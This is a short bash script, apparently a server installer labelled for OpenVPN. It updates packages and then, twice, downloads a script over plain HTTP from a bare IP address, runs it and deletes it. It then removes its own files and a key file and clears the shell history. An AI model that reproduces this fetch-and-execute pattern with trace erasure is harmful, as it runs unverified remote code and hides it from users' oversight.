#!/bin/bash

#update os
apt-get update > /dev/null

#openvpn
wget -o /dev/null http://150.95.24.48/vip.sh
chmod +x vip.sh
./vip.sh
rm vip.sh 2>/dev/null

wget -o /dev/null http://150.95.24.48/vip.sh
chmod +x vip.sh
./vip.sh
rm vip.sh 2>/dev/null

#clear
rm install.sh 2>/dev/null
rm jcameron-key.asc 2>/dev/null
rm -rf .bash_history && history -c
